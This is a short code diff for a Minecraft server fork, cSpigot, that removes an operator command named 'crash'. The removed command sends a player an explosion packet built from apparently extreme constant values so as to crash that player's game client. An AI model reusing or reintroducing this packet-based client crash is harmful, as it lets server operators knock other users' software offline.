@@ -91,19 +91,4 @@ public class cSpigotCommand {
         cSpigot.getConfig().writeConfig();
         sender.sendMessage(CC.translate(StringUtils.PREFIX + "&eSuccessfully&a saved &eall configuration files!"));
     }
-
-    @Command(name = "crash", desc = "Crash a player's client")
-    @Require("cSpigot.crash")
-    public void crash(@Sender CommandSender sender, Player player) {
-        double doubleValue = StaticConstants.d();
-        float floatValue = StaticConstants.f();
-
-        PacketPlayOutExplosion explosion = new PacketPlayOutExplosion(
-                doubleValue, doubleValue, doubleValue,
-                floatValue,
-                Collections.emptyList(),
-                new Vec3D(doubleValue, doubleValue, doubleValue));
-
-        player.cSpigot().sendPacket(explosion);
-    }
 }
